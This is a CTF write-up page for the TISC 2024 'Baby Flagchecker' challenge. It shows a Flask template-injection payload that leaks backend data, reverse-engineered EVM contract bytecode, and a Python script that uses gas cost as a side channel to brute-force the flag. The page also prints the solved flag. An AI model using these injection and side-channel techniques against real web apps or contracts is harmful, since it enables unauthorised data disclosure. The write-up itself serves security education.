<!DOCTYPE html><html lang="en"><head>
    <meta charset="UTF-8">
    <link rel="icon" href="/ctf-writeups/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="google-site-verification" content="dl1D1u59Q1pKaeEVUFtuHxnfuBFKhks8hA19r7WuxTY">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Judson:ital,wght@0,400;0,700;1,400&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Gabarito:wght@400..900&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght@400..600" rel="stylesheet">
    <title>TISC 2024 - Baby Flagchecker</title>
    <script type="module" crossorigin="" src="/ctf-writeups/assets/app-7e5aabe4.js"></script>
    <link rel="stylesheet" href="/ctf-writeups/assets/index-c9002530.css">
  <meta property="article:tag" content="TISC 2024"><meta property="article:tag" content="rev"><meta property="article:tag" content="blockchain"><meta name="description" content="Similar to level 6, this is also a blockchain challenge, though with more emphasis on rev. Partial source is provided for this challenge:

![](/ctf-writeups/tisc24/baby_flagchecker_tree.png)

# SSTI leak

There are 2 parts, the frontend web app and the backend where the private blockchain network is running. I quickly spotted the ssti vulnerability with the password field:

```python:main.py
@app.route('/submit', methods=['POST'])
def submit():
    password = request.form['password']
    try:
        if len(password) > 32:
            return render_template_string(&quot;&quot;&quot;
        ... error message, html omitted for brevity ...
        &quot;&quot;&quot;)

        response = requests.post(&quot;http://server:5000/check&quot;, json={&quot;password&quot;: password})
        response_data = response.json()

        return render_template_string(&quot;&quot;&quot;
        ... html omitted for brevity ...
            <body>
                <div class=&quot;container&quot;>
                    <p>Result for &quot;&quot;&quot; + password + &quot;&quot;&quot;:</p>
                    {% if response_data[&quot;output&quot;] %}
                    <h1>Accepted</h1>
                    {% else %}
                    <h1>Invalid</h1>
                    {% endif %}
                    <a href=&quot;/&quot;>Go back</a>
                </div>
            </body>
        </html>
        &quot;&quot;&quot;, response_data=response_data)
    except Exception as e:
        return str(e)
```

Unfortunately, the 32 character length limit means we cannot get RCE. However, we can leak `response_data` with by passing password = `{{response_data}}`:

![](/ctf-writeups/tisc24/response_data_leak.png)

# Backend server

On the backend there is a single POST endpoint:

```python:main.py
...

@app.post(&quot;/check&quot;)
async def check(password_input: PasswordInput):
    password = password_input.password

    try:
        web3_client = connect_to_anvil()
        setup_contract = init_setup_contract(web3_client)
        output_json = call_check_password(setup_contract, password)

        return output_json
    except RuntimeError as e:
        raise HTTPException(status_code=500, detail=str(e))
```

The format of `output_json` is as follows:

```python:connect_to_testnet.py
...

def call_check_password(setup_contract, password):
    # Call checkPassword function
    passwordEncoded = '0x' + bytes(password.ljust(32, '\0'), 'utf-8').hex()

    # Get result and gas used
    try:
        gas = setup_contract.functions.checkPassword(passwordEncoded).estimate_gas()
        output = setup_contract.functions.checkPassword(passwordEncoded).call()
        logger.info(f'Gas used: {gas}')
        logger.info(f'Check password result: {output}')
    except Exception as e:
        logger.error(f'Error calling checkPassword: {e}')

    # Return debugging information
    return {
        &quot;output&quot;: output,
        &quot;contract_address&quot;: setup_contract.address,
        &quot;setup_contract_bytecode&quot;: os.environ['SETUP_BYTECODE'],
        &quot;adminpanel_contract_bytecode&quot;: os.environ['ADMINPANEL_BYTECODE'],
        &quot;secret_contract_bytecode&quot;: os.environ['SECRET_BYTECODE'],
        &quot;gas&quot;: gas
    }
```

Essentially it connects to the private blockchain network and calls the `checkPassword` function on the Setup contract. The addresses of 2 other contracts are passed to Setup's constructor, so it probably calls some functions in them too.

Going back to the ssti leak, we now have the contract bytecode for 2 contracts: Setup and AdminPanel. I used an online solidity decompiler [https://ethervm.io/decompile](https://ethervm.io/decompile) which gave me a decompilation and disassembly.

# Reversing AdminPanel

AdminPanel was the first contract I reversed since it was shorter and easier to follow. The decompilation is suspiciously short:

```solidity
contract Contract {
    function main() {
        memory[returndata.length:returndata.length + 0x85] = code[0x09:0x8e];
        return memory[returndata.length:returndata.length + 0x85];
    }
}
```

But looking at the disassembly, we can see there is a lot more going on. It seems like the above code is just replacing the section of executable memory with more bytecode. This additional bytecode is found right after it, beginning with this section:

```plaintext
	0009    5F    5F // PUSH 0
	000A    35    CALLDATALOAD
	000B    80    DUP1
	000C    60    PUSH1 0xd8
	000E    1C    SHR
	000F    64    PUSH5 0x544953437b // &quot;TISC{&quot;
	0015    14    EQ
```

(Note: while reversing the assembly I refered to this [evm instruction set manual](https://www.ethervm.io/), a surprisingly comprehensive resource)

The above section loads the first 32 bytes of `msg.data` (basically arguments passed to the function), shifts right 27 bytes, and compares with &quot;TISC{&quot;. So it just checks for the flag start.

```plaintext
	0016    81    DUP2 // msg.data[0:32]
	0017    60    PUSH1 0x80
	0019    1B    SHL
	001A    60    PUSH1 0xf8
	001C    1C    SHR
	001D    60    PUSH1 0x7d
	001F    14    EQ
```

The next section translates to `((msg.data[0:32] << 16 bytes) >> 31 bytes) == &quot;}&quot;` - checking the end of the flag. From this, we can also deduce the length of the flag - 17 characters.

This next section is slightly more tricky:

```plaintext
	0024    61    PUSH2 0x0022
	0027    57    *JUMPI
	0028    5F    5F
	0029    5F    5F
	002A    FD    *REVERT
	002B    5B    JUMPDEST
	002C    60    PUSH1 0x04
	002E    35    CALLDATALOAD
	002F    60    PUSH1 0x98
	0031    63    PUSH4 0x6b35340a
	0036    60    PUSH1 0x60
	0038    52    MSTORE
	0039    60    PUSH1 0x20  // length
	003B    60    PUSH1 0x60  // offset
	003D    20    SHA3
	003E    90    SWAP1
	003F    1B    SHL
	0040    18    XOR
```

It translates to `msg.data[4:36] ^ (keccak256(0x6b35340a) << 19 bytes)`. Let's move on to the next section.

```plaintext
	0041    60    PUSH1 0x24
	0043    35    CALLDATALOAD
	0044    63    PUSH4 0x66fbf07e
	0049    60    PUSH1 0x20
	004B    52    MSTORE
	004C    60    PUSH1 0x20
	004E    5F    5F
	004F    60    PUSH1 0x04
	0051    60    PUSH1 0x3c
	0053    84    DUP5
	0054    5A    GAS
	0055    F4    DELEGATECALL
```

This is performing some function call, and after consulting the aforementioned ISA manual I realised it is calling the function at address `msg.data[0x24:0x44]`, with arguments `memory[0x3c:0x3c+4]`. The return value is stored at `memory[0:0x20]`. Later on, I realised that the first 4 bytes in the argument are used as a &quot;selector&quot;, which identifies which function in the contract to call. Here's an example from [this article](https://medium.com/@eiki1212/explaining-ethereum-contract-abi-evm-bytecode-6afa6e917c3b)

```plaintext
// Encode function with keccak256.
> web3.utils.sha3(“withdraw(uint256)”)
0x2e1a7d4d13322e7b96f9a57413e1525c250fb7a9021cf91d1540d5b69f16a49f
// Extract first 4 bytes.
0x2c1a7d4d
```

So it's basically doing something like `mystery_contract.function()`, with the address of `mystery_contract` being stored at `memory[0x24:0x44]`.

Additionally, this means that `msg.data[0:4` = &quot;TISC&quot; is the selector for this contract function. So the user input should just be the `{...}` part.

The next section is a bit long winded, but after tracking how the stack changes I realised it's just comparing the output of `msg.data[4:36] ^ (keccak256(0x6b35340a) << 19 bytes)` to `mystery_contract.function()`. It checks that they have 0xd = 13 equal bytes, and returns 0 or 1 based on that. Here it is:

```plaintext
	0057    5F    5F
	0058    51    MLOAD
	0059    5F    5F
	005A    5F    5F
	005B    5B    JUMPDEST
	005C    82    DUP3
	005D    82    DUP3
	005E    1A    BYTE
	005F    85    DUP6
	0060    83    DUP4
	0061    1A    BYTE
	0062    14    EQ
	0063    61    PUSH2 0x0070
	0066    57    *JUMPI
	0067    5B    JUMPDEST
	0068    90    SWAP1
	0069    60    PUSH1 0x01
	006B    01    ADD
	006C    80    DUP1
	006D    60    PUSH1 0x0d
	006F    14    EQ
	0070    61    PUSH2 0x0078
	0073    57    *JUMPI
	0074    90    SWAP1
	0075    61    PUSH2 0x0052
	0078    56    *JUMP
	0079    5B    JUMPDEST
	007A    60    PUSH1 0x01
	007C    01    ADD
	007D    61    PUSH2 0x005e
	0080    56    *JUMP
	0081    5B    JUMPDEST
	0082    81    DUP2
	0083    60    PUSH1 0x0d
	0085    14    EQ
	0086    60    PUSH1 0x40
	0088    52    MSTORE
	0089    60    PUSH1 0x20
	008B    60    PUSH1 0x40
	008D    F3    *RETURN
```

Since we don't have access to the `mystery_contract` bytecode, we have to continue reversing.

# Reversing Setup

When I decompiled Setup on ethervm.io, it helpfully informed me that the decompilation was probably constructor bytecode and to get the actual deployed contract I would have to &quot;remove the constructor prefix, usually up to the next 6060 or 6080&quot;. I did so, and got the following decompilation (annotated with my comments):

```solidity
contract Contract {
    function main() {
        memory[0x40:0x60] = 0x80;
        var var0 = msg.value;
    
        if (var0) { revert(memory[0x00:0x00]); }
    
        if (msg.data.length < 0x04) { revert(memory[0x00:0x00]); }
    
        var0 = msg.data[0x00:0x20] >> 0xe0;
    
        if (var0 != 0x410eee02) { revert(memory[0x00:0x00]); } // 0x410eee02 seems to be the selector
    
        var var1 = 0x0043;
        var var2 = 0x003e;
        var var3 = msg.data.length;
        var var4 = 0x04;
        var2 = func_0115(var3, var4); // get first argument
        var1 = func_003E(var2); // call checkPassword
        var temp0 = memory[0x40:0x60];
        memory[temp0:temp0 + 0x20] = !!var1;
        var temp1 = memory[0x40:0x60];
        return memory[temp1:temp1 + (temp0 + 0x20) - temp1];
    }
    
    function func_003E(var arg0) returns (var r0) {
        // Called from main
        //
        // Parameters:
        // ===========
        // - arg0: user input
        //
        // What it does:
        // =============
        // - this should be checkPassword. returns 1 or 0

        var var0 = 0x00;
        var temp0 = memory[0x40:0x60]; // some sort of solidity stack pointer?
        memory[temp0 + 0x24:temp0 + 0x24 + 0x20] = arg0;
        var temp1 = (0x01 << 0xa0) - 0x01; // mask for lower 20 bytes
        memory[temp0 + 0x44:temp0 + 0x44 + 0x20] = temp1 &amp; storage[0x01]; // storage[1] probably contains some contract address
        var temp2 = memory[0x40:0x60];
        memory[temp2:temp2 + 0x20] = temp0 - temp2 + 0x44; // temp0 and temp2 cancel out, not sure why this suboptimal bytecode was generated.
        memory[0x40:0x60] = temp0 + 0x64;
        var temp3 = temp2 + 0x20;
        // the next line is essentially memory[temp3:temp3 + 4] = &quot;TISC&quot;
        memory[temp3:temp3 + 0x20] = (memory[temp3:temp3 + 0x20] &amp; (0x01 << 0xe0) - 0x01) | (0x54495343 << 0xe0);

        // at this point, we have the following data in memory[temp0:temp0 + 0x64]:
        // [temp0 + 0x00]: 0x44 - 32 bytes
        // [temp0 + 0x20]: &quot;TISC&quot; - 4 bytes
        // [temp0 + 0x24]: user input (arg0) - 32 bytes
        // [temp0 + 0x44]: contract address - 32 bytes (only lower 20 bytes are used)

        var var1 = var0;
        var var2 = var1;
        var var3 = temp1 &amp; storage[var2]; // storage[0], seems to be another contract address
        var var5 = temp2;
        var var6 = memory[0x40:0x60];
        var var4 = 0x00b9;
        var4 = func_012E(var5, var6); // copy 0x44 bytes from [temp0 + 0x20] to [temp0 + 0x64]
        var temp4 = memory[0x40:0x60];
        var temp5;

        // the following function call:
        // ============================
        // - contract address: storage[0]
        // - function selector: &quot;TISC&quot;
        // - extra data:
        //   - user input
        //   - storage[1]
        //
        // here, we can deduce that it's calling the AdminPanel function we reversed previously.
        // so storage[1] is the address of 'mystery_contract', most likely the Secret contract.
        temp5, memory[temp4:temp4 + 0x00] = address(var3).call.gas(msg.gas)(memory[temp4:temp4 + var4 - temp4]);
        var4 = returndata.length;
        var5 = var4;
    
        if (var5 == 0x00) {
            var2 = 0x60;
            var1 = var3;
            var3 = 0x010a;
            var4 = var2;
            var3 = func_015D(var4);
        
        label_010A:
            return var3 == 0x01;
        } else {
            var temp6 = memory[0x40:0x60];
            var4 = temp6;
            memory[0x40:0x60] = var4 + (returndata.length + 0x3f &amp; ~0x1f);
            memory[var4:var4 + 0x20] = returndata.length;
            var temp7 = returndata.length;
            memory[var4 + 0x20:var4 + 0x20 + temp7] = returndata[0x00:0x00 + temp7];
            var2 = var4;
            var1 = var3;
            var3 = 0x010a;
            var4 = var2;
            var3 = func_015D(var4);
            goto label_010A;
        }
    }
    
    function func_0115(var arg0, var arg1) returns (var r0) {
        // Called from func_003E
        // 
        // Parameters:
        // ===========
        // - arg0: msg.data.length
        // - arg1: 0x4
        // 
        // What it does:
        // =============
        // - returns the first param (32 bytes) in arguments (msg.data)

        var var0 = 0x00;
    
        if (arg0 - arg1 i>= 0x20) { return msg.data[arg1:arg1 + 0x20]; }
        else { revert(memory[0x00:0x00]); }
    }
    
    function func_012E(var arg0, var arg1) returns (var r0) {
        // Called from func_003E
        // 
        // Parameters:
        // ===========
        // - arg0: func_003E_temp0 (initial 'base pointer')
        // - arg1: func_003E_temp0 + 0x64
        //
        // What it does:
        // =============
        // - copies data from [arg0 + 0x20] to [arg1]
        // - length is specified by 32 byte number at [arg0]
        // - in the context of func_003E it copies 0x44 bytes from [func_003E_temp0 + 0x20] to [func_003E_temp0 + 0x64]
        // - returns the memory index right after the destination

        var var0 = 0x00;
        var var1 = memory[arg0:arg0 + 0x20];
        var var2 = 0x00;
    
        if (var2 >= var1) {
        label_014F:
            memory[arg1 + var1:arg1 + var1 + 0x20] = 0x00;
            return arg1 + var1;
        } else {
        label_013E:
            var temp0 = var2;
            memory[temp0 + arg1:temp0 + arg1 + 0x20] = memory[arg0 + temp0 + 0x20:arg0 + temp0 + 0x20 + 0x20];
            var2 = temp0 + 0x20;
        
            if (var2 >= var1) { goto label_014F; }
            else { goto label_013E; }
        }
    }
    
    function func_015D(var arg0) returns (var r0) {
        var temp0 = arg0;
        var var0 = memory[temp0 + 0x20:temp0 + 0x20 + 0x20];
        var var1 = memory[temp0:temp0 + 0x20];
    
        if (var1 >= 0x20) { return var0; }
        else { return var0 &amp; (~0x00 << (0x20 - var1 << 0x03)); }
    }
}
```

After reversing all the code, we now have a clear understanding of what's going on. Here's the python equivalent:

```python
class Secret:
    def getSecret(self):
        # unknown
        return ...


class AdminPanel:
    def actualChecking(self, password, secret):
        return xor_bytes(password, keccak256(0x6b35340a) << 0x98) == secret.getSecret()


class Setup:
    def __init__(self, adminPanel, secret):
        self.adminPanel = adminPanel
        self.secret = secret

    def checkPassword(self, password):
        return self.adminPanel.actualChecking(password, self.secret) == 1
```

We still have no way of getting the flag without knowing what's going on in `Secret.getSecret()`. Hmm ...

I went down a mini rabbit hole looking at the suspicious instructions near the end of the Setup contract:

```plaintext
0184    FE    *ASSERT
	0185    A2    LOG2
	0186    64    PUSH5 0x6970667358
	018C    22    22
	018D    12    SLT
	018E    20    SHA3
	018F    E0    E0
	0190    F8    F8
	0191    33    CALLER
	0192    3B    EXTCODESIZE
	0193    E0    E0
	0194    83    DUP4
	0195    B8    B8
	0196    07    SMOD
	0197    F8    F8
	0198    95    SWAP6
	0199    1D    SAR
	019A    48    BASEFEE
	019B    68    PUSH9 0xa6231b41254b2f6157
	01A5    A9    A9
	01A6    FB    FB
	01A7    62    PUSH3 0xeff1bc
	01AB    EF    EF
	01AC    AF    AF
	01AD    D8    D8
	01AE    4E    4E
	01AF    64    PUSH5 0x736f6c6343
	01B5    00    *STOP
	01B6    08    ADDMOD
	01B7    13    SGT
	01B8    00    *STOP
	01B9    33    CALLER
```

I saw the ascii hex values and thought this might be important to the challenge. But eventually I came across [this stackexchange post](https://ethereum.stackexchange.com/questions/23525/what-is-the-cryptic-part-at-the-end-of-a-solidity-contract-bytecode) and realised it was just some metadata not relevant to the challenge.

# Finding an Oracle

I went back to the web interface to see if there was anything I missed. Looking at the response_data leak, is there any additional information we can use? Aside from the contract bytecodes and output, we also have access to `setup_contract_address` and `gas`. The former is useless since it is a fixed value we can't do anything with. But what about `gas`?

I recalled from browsing this list of [ethervm opcodes](https://ethereum.org/en/developers/docs/evm/opcodes/) that each opcode has a specific gas cost. So if a different sequence of opcodes are executed, the gas cost will be different. After testing some payloads, I confirmed that `gas` is deterministic based on the input.

![](/ctf-writeups/evm_opcode_gas.png)

I realised that it was possible to perform something similar to a timing attack, where in this case the gas cost represents the 'time' taken to execute the flag checking algorithm. If a certain string has a higher gas cost compared to another one, that means it passed more of the checks in the character-by-character string comparison. Thus, we can write a script to query a large number of strings that vary by only a single character, and narrow down which character is correct. Repeating this process for each character in the flag allows us to leak it eventually.

I wrote a python script to achieve this:

```python:s.py
import requests
from string import printable

template = list('{XXXXXXXXXXX}' + '{{response_data}}')

space = set(printable).difference('#{}%')  # these characters were causing errors with flask templating

for x in range(1, 12):
    for c in space:
        payload = template[:]
        payload[x] = c
        resp = requests.post('http://chals.tisc24.ctf.sg:52416/submit',
                             data={'password': ''.join(payload)})
        search_for = &quot;&amp;#39;gas&amp;#39;: &quot;
        try:
            i = resp.text.index(search_for) + len(search_for)
            j = resp.text.index('}', i)
            gas = int(resp.text[i:j])
            if gas >= 33377:
                print(c, end='', flush=True)
                break
        except:
            print(resp.text)
            import sys
            sys.exit(1)
```

Running the script, we are able to leak the flag. Now wrap it in the flag format: `TISC{g@s_Ga5_94S}`
"><meta name="author" content="Jia Jie"></head>
  <body>
    <div id="app" data-server-rendered="true"><div><div class="w-full fixed z-20 bg-[#1e1e1e] flex flex-col items-center transition-transform duration-500"><div class="w-full h-16 flex-shrink-0 flex items-center justify-between px-10 max-sm:px-5 max-sm:h-14"><div class="w-10 h-10 flex flex-col items-center justify-center gap-y-1 cursor-pointer mr-3 xl:hidden" data-v-eaee368e=""><div class="bar b1" data-v-eaee368e=""></div><div class="bar b2" data-v-eaee368e=""></div><div class="bar b3" data-v-eaee368e=""></div></div><span class="text-xl font-semibold">Jia Jie's writeups</span><div class="flex-1"></div><button class="group w-10 h-10 rounded-full grid place-items-center"><i class="material-symbols-outlined text-2xl transition-colors group-hover:text-primary">search</i></button><a href="https://github.com/mkofdwu/ctf-writeups" target="_blank" class="group w-10 h-10 rounded-full grid place-items-center"><svg width="28" height="28" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg" class="transition-colors fill-white group-hover:fill-primary"><path d="M18.0015 3C9.71403 3 3.00153 9.7125 3.00153 18C2.99972 21.1487 3.98943 24.2181 5.83024 26.7727C7.67106 29.3273 10.2695 31.2373 13.257 32.232C14.007 32.3625 14.289 31.9125 14.289 31.518C14.289 31.1625 14.2695 29.982 14.2695 28.725C10.5015 29.4195 9.52653 27.807 9.22653 26.9625C9.05703 26.5305 8.32653 25.2 7.68903 24.843C7.16403 24.5625 6.41403 23.868 7.66953 23.85C8.85153 23.8305 9.69453 24.9375 9.97653 25.3875C11.3265 27.6555 13.482 27.018 14.3445 26.625C14.4765 25.65 14.8695 24.9945 15.3015 24.6195C11.964 24.2445 8.47653 22.95 8.47653 17.2125C8.47653 15.5805 9.05703 14.232 10.014 13.1805C9.86403 12.8055 9.33903 11.268 10.164 9.2055C10.164 9.2055 11.4195 8.8125 14.289 10.7445C15.5101 10.4056 16.7718 10.235 18.039 10.2375C19.314 10.2375 20.589 10.4055 21.789 10.743C24.6585 8.793 25.914 9.207 25.914 9.207C26.739 11.2695 26.214 12.807 26.064 13.182C27.0195 14.232 27.6015 15.5625 27.6015 17.2125C27.6015 22.9695 24.096 24.2445 20.757 24.6195C21.3015 25.0875 21.771 25.9875 21.771 27.3945C21.771 29.4 21.7515 31.0125 21.7515 31.5195C21.7515 31.9125 22.0335 32.3805 22.7835 32.2305C25.7608 31.2249 28.3478 29.3111 30.1805 26.7584C32.0132 24.2056 32.9993 21.1425 33 18C33 9.7125 26.2875 3 18 3H18.0015Z"></path></svg></a><a href="https://mkofdwu.github.io/" target="_blank" class="main-website-btn group h-10 pl-4 pr-2 ml-3 flex items-center font-semibold rounded-full border max-[500px]:hidden transition-all duration-500 hover:border-primary hover:text-black"> main website <i class="material-symbols-outlined text-2xl text-xl ml-2 transition-colors duration-500 group-hover:text-black">arrow_outward</i></a><div class="h-0 hide-scrollbar fixed left-0 top-16 z-10 w-full bg-black overflow-y-auto origin-top duration-300 transition-all xl:hidden max-sm:top-14"><div class="opacity-0 pt-10 duration-300 transition-opacity"><div class="flex flex-col" full-width="true"><!--[--><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2024</span><!--[--><a href="/ctf-writeups/navigating-the-digital-labyrinth" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 1</span></a><a href="/ctf-writeups/language-labyrinth-and-graphicsmagick" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 2</span></a><a href="/ctf-writeups/digging-up-history" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 3</span></a><a href="/ctf-writeups/alligatorpay" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 4</span></a><a href="/ctf-writeups/hardware-isnt-that-hard" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 5</span></a><a href="/ctf-writeups/noncevigator" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 6</span></a><a aria-current="page" href="/ctf-writeups/baby-flagchecker" class="router-link-active router-link-exact-active group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#64A577" stroke-width="2"></path></svg><span class="self-center font-semibold text-primary">Level 7</span></a><a href="/ctf-writeups/wallfacer" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 8</span></a><a href="/ctf-writeups/imphash" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 9</span></a><a href="/ctf-writeups/diffuse" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 10</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">Greyhats 2024</span><!--[--><a href="/ctf-writeups/proto-grader" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Proto Grader</span></a><a href="/ctf-writeups/hi-doggy" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Hi Doggy</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">UIUCTF 2024</span><!--[--><a href="/ctf-writeups/push-and-pickle" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Push and Pickle</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2023</span><!--[--><a href="/ctf-writeups/disk-archaeology" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 1</span></a><a href="/ctf-writeups/reckless-mistake" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 2</span></a><a href="/ctf-writeups/kpa" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 3</span></a><a href="/ctf-writeups/rubg" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 4</span></a><a href="/ctf-writeups/palindromes-invitation" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 5</span></a><a href="/ctf-writeups/the-chosen-ones" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 6</span></a><a href="/ctf-writeups/devsecmeow" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 7</span></a><a href="/ctf-writeups/blind-sql-injection" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 8</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">LITCTF 2023</span><!--[--><a href="/ctf-writeups/the-other-obligatory-pyjail" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">the other obligatory pyjail</span></a><!--]--></div><!--]--></div></div></div></div><div class="dotted-line-hori z-10 w-[calc(100vw-5rem)] max-sm:w-screen"></div></div><div class="fixed z-10 w-[17.5rem] h-screen overflow-y-hidden flex max-xl:hidden"><div class="flex flex-col hide-scrollbar h-full overflow-y-auto pt-24 pr-8"><!--[--><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2024</span><!--[--><a href="/ctf-writeups/navigating-the-digital-labyrinth" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 1</span></a><a 